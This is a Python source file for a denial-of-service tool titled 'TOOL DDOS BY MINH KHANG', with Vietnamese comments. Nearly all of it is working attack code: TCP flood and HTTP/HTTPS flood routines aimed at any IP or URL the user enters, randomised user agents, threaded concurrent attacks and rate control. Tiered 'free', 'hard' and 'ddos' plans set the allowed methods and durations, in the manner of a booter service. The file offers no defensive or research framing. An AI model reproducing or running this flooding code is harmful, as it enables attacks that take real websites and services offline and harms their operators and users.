#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TOOL DDOS BY MINH KHANG
Version: 3.0
Author: Minh Khang
"""

import socket
import threading
import time
import random
import os
import sys
import urllib.parse
import ssl  # Mang lên đầu để tránh lag khi loop

# ========== CONFIGURATION ==========
USER_DATABASE = {
    "root": "free",
    "6.4": "hard",
    "cry": "hard",
    "x2": "hard",
    "ddos": "ddos",
    "test": "free",
    "admin": "hard",
}

PLANS = {
    "free": {
        "methods": ["tcp", "http", "http-flood"],
        "max_time": 120,
        "max_rps": 100,
        "max_concurrent": 2,
    },
    "hard": {
        "methods": ["tcp", "http", "https", "http-flood", "https-flood", "syn"],
        "max_time": 300,
        "max_rps": 500,
        "max_concurrent": 10,
    },
    "ddos": {
        "methods": ["tcp", "http", "https", "http-flood", "https-flood", "syn", "udp"],
        "max_time": 600,
        "max_rps": 1000,
        "max_concurrent": 50,
    },
}

BOT_IPS = [
    "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4",
    "192.168.1.5", "192.168.1.6", "192.168.1.7", "192.168.1.8",
]

PROXY_LIST = [
    "proxy1.com:8080", "proxy2.com:3128", "proxy3.com:8080",
]

# ========== ATTACK MANAGER ==========
class DDoSAttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.stats = {
            "total_requests": 0,
            "successful": 0,
            "failed": 0,
            "start_time": time.time()
        }
    
    def get_user_plan(self, username):
        """Get user's subscription plan"""
        return USER_DATABASE.get(username, "free")
    
    def validate_attack(self, username, method, duration, rps=0):
        """Validate if user can launch attack"""
        plan_name = self.get_user_plan(username)
        plan = PLANS.get(plan_name, PLANS["free"])
        
        if method not in plan["methods"]:
            return False, f"Method '{method}' not allowed for {plan_name} plan"
        
        if duration > plan["max_time"]:
            return False, f"Max duration is {plan['max_time']} seconds"
        
        if rps > plan["max_rps"]:
            return False, f"Max RPS is {plan['max_rps']}"
        
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() 
                              if a["username"] == username)
            if user_attacks >= plan["max_concurrent"]:
                return False, f"Max {plan['max_concurrent']} concurrent attacks"
        
        return True, "OK"
    
    def parse_target(self, target_input):
        """Parse target input (IP or URL)"""
        if not target_input:
            return None, None, None, "No target provided"
        
        if "://" in target_input:
            try:
                parsed = urllib.parse.urlparse(target_input)
                if not parsed.scheme:
                    target_input = "http://" + target_input
                    parsed = urllib.parse.urlparse(target_input)
                
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                is_https = (parsed.scheme == "https")
                return host, port, is_https, None
            except:
                return None, None, None, "Invalid URL format"
        else:
            if ":" in target_input:
                parts = target_input.split(":")
                host = parts[0]
                try:
                    port = int(parts[1])
                except:
                    port = 80
            else:
                host = target_input
                port = 80
            return host, port, False, None
    
    # ========== ATTACK METHODS ==========
    def tcp_flood(self, host, port, duration, attack_id):
        """TCP Flood attack"""
        print(f"[Attack #{attack_id}] Starting TCP Flood on {host}:{port}")
        
        end_time = time.time() + duration
        packet = os.urandom(1024)  # Dùng os.urandom chuẩn hơn
        
        while time.time() < end_time and attack_id in self.active_attacks:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                
                for _ in range(100):
                    sock.send(packet)
                
                sock.close()
                with self.lock:
                    self.stats["successful"] += 1
                    self.stats["total_requests"] += 1
            except:
                with self.lock:
                    self.stats["failed"] += 1
                    self.stats["total_requests"] += 1
            
            time.sleep(0.01)
        
        self._cleanup_attack(attack_id)
    
    def http_flood(self, host, port, is_https, duration, rps, attack_id):
        """HTTP Flood attack with RPS control"""
        print(f"[Attack #{attack_id}] Starting HTTP{'S' if is_https else ''} Flood on {host}:{port}")
        
        end_time = time.time() + duration
        request_count = 0
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        ]
        
        paths = ["/", "/index.html", "/home", "/api/test", "/admin"]
        
        while time.time() < end_time and attack_id in self.active_attacks:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.connect((host, port))
                
                path = random.choice(paths)
                request_lines = [
                    f"GET {path} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {random.choice(user_agents)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Connection: keep-alive",
                    "\r\n"
                ]
                
                request = "\r\n".join(request_lines)
                sock.send(request.encode())
                
                try:
                    sock.recv(1024)
                    with self.lock:
                        self.stats["successful"] += 1
                except:
                    with self.lock:
                        self.stats["failed"] += 1
                
                sock.close()
                request_count += 1
                with self.lock:
                    self.stats["total_requests"] += 1
                
            except:
                with self.lock:
                    self.stats["failed"] += 1
                    self.stats["total_requests"] += 1
            
            if rps > 0:
                time.sleep(1.0 / rps)
        
        print(f"\n[Attack #{attack_id}] Completed! Total requests: {request_count}")
        self._cleanup_attack(attack_id)
    
    def _cleanup_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
    
    def launch_attack(self, username, method, target, duration=60, rps=100):
        host, port, is_https, error = self.parse_target(target)
        if error:
            return None, error
        
        can_attack, message = self.validate_attack(username, method, duration, rps)
        if not can_attack:
            return None, message
        
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            
            self.active_attacks[attack_id] = {
                "id": attack_id, "username": username, "method": method,
                "target": target, "host": host, "port": port,
                "duration": duration, "rps": rps, "start_time": time.time(),
                "thread": None,
            }
        
        if method in ["http-flood", "https-flood"]:
            thread = threading.Thread(target=self.http_flood, args=(host, port, is_https, duration, rps, attack_id), daemon=True)
        else:
            thread = threading.Thread(target=self.tcp_flood, args=(host, port, duration, attack_id), daemon=True)
        
        self.active_attacks[attack_id]["thread"] = thread
        thread.start()
        return attack_id, f"Attack #{attack_id} started successfully!"

    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
                return True, f"Attack #{attack_id} stopped"
        return False, f"Attack #{attack_id} not found"

    def stop_all_attacks(self):
        with self.lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
            return count

    def list_attacks(self):
        with self.lock:
            attacks = list(self.active_attacks.values())
        if not attacks: return []
        
        result = []
        current_time = time.time()
        for attack in attacks:
            elapsed = current_time - attack["start_time"]
            remaining = max(0, attack["duration"] - elapsed)
            result.append({
                "id": attack["id"], "user": attack["username"], "method": attack["method"],
                "target": attack["target"], "rps": attack["rps"], "elapsed": f"{elapsed:.1f}s",
                "remaining": f"{remaining:.1f}s", "duration": f"{attack['duration']}s",
            })
        return result

    def get_stats(self):
        with self.lock:
            stats = self.stats.copy()
            stats["active_attacks"] = len(self.active_attacks)
            stats["uptime"] = time.time() - stats["start_time"]
        return stats

# ========== USER INTERFACE ==========
class UserInterface:
    def __init__(self):
        self.manager = DDoSAttackManager()
        self.running = True
    
    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")
    
    def display_banner(self):
        self.clear_screen()
        print("=" * 60)
        print("TOOL DDOS BY MINH KHANG".center(60))
        print("Version 3.0 - Professional Edition".center(60))
        print("=" * 60)
        stats = self.manager.get_stats()
        print(f"Active: {stats['active_attacks']} | Requests: {stats['total_requests']}")
        print("=" * 60)
    
    def main_menu(self):
        print("\n1. Launch Attack  2. Active Attacks  3. Stop Attack")
        print("4. Stop All       5. User Info       6. Stats       7. Exit")
        return input("\nSelect (1-7): ").strip()
    
    def launch_attack_menu(self):
        username = input("Username: ").strip()
        plan_name = self.manager.get_user_plan(username)
        plan = PLANS.get(plan_name, PLANS["free"])
        
        print(f"\nPlan: {plan_name} | Methods: {', '.join(plan['methods'])}")
        method = input("Method: ").strip()
        target = input("Target (IP/URL): ").strip()
        try:
            duration = int(input("Duration: ").strip())
            rps = int(input("RPS: ").strip()) if "flood" in method else 0
            attack_id, msg = self.manager.launch_attack(username, method, target, duration, rps)
            print(msg)
        except: print("Invalid Input!")

    def view_attacks_menu(self):
        attacks = self.manager.list_attacks()
        for a in attacks:
            print(f"ID {a['id']} | {a['method']} | {a['target']} | Rem: {a['remaining']}")

    def stop_attack_menu(self):
        try:
            aid = int(input("Attack ID to stop: "))
            _, msg = self.manager.stop_attack(aid)
            print(msg)
        except: print("Invalid ID")

    def user_info_menu(self):
        user = input("Username: ")
        plan = self.manager.get_user_plan(user)
        print(f"User: {user} | Plan: {plan}")

    def stats_menu(self):
        s = self.manager.get_stats()
        print(f"Total: {s['total_requests']} | OK: {s['successful']} | Fail: {s['failed']}")

    def run(self):
        """Hàm run đã được sửa lỗi thụt lề"""
        while self.running:
            try:
                self.display_banner()
                choice = self.main_menu()
                if choice == "1": self.launch_attack_menu()
                elif choice == "2": self.view_attacks_menu()
                elif choice == "3": self.stop_attack_menu()
                elif choice == "4": self.manager.stop_all_attacks()
                elif choice == "5": self.user_info_menu()
                elif choice == "6": self.stats_menu()
                elif choice == "7": self.running = False
                
                if self.running: input("\nPress Enter...")
            except KeyboardInterrupt: break
            except Exception as e:
                print(f"Error: {e}")
                input()

if __name__ == "__main__":
    ui = UserInterface()
    ui.run()

